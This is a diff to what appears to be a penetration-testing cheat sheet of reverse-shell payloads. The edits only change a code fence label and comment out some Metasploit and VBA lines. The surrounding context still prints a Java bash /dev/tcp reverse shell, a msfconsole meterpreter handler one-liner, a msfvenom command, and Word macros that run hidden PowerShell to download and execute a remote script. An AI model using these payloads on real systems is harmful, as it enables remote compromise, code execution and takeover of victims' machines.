@@ -103,7 +103,7 @@ powershell -nop -enc <BASE64_ENCODED_COMMAND>
 
 ### Java Reverse Shell
 
-```bash
+```text
 # Java reverse shell
 Runtime rt = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}; Process p = rt.exec(cmd);
 
@@ -345,11 +345,11 @@ socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0 FILE:`tty`,raw,echo=0
 ```bash
 # Interactive multi/handler for staged payloads
 msfconsole
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 10.0.0.1
-msf6 exploit(multi/handler) > set LPORT 4444
-msf6 exploit(multi/handler) > exploit
+# msf6 > use exploit/multi/handler
+# msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+# msf6 exploit(multi/handler) > set LHOST 10.0.0.1
+# msf6 exploit(multi/handler) > set LPORT 4444
+# msf6 exploit(multi/handler) > exploit
 
 # One-liner multi/handler
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set ExitOnSession false; exploit -j"
@@ -615,12 +615,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f vba
 
 # Manual VBA shell launcher:
 # Insert into Word/Excel VBA editor (Alt+F11 -> ThisDocument)
-Sub AutoOpen()
+# Sub AutoOpen()
     Shell "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')""", vbHide
 End Sub
 
 # Word macro with direct shellcode execution
-Sub Document_Open()
+# Sub Document_Open()
     Dim cmd As String
     cmd = "powershell -nop -w hidden -enc <BASE64_COMMAND>"
     Shell cmd, vbHide
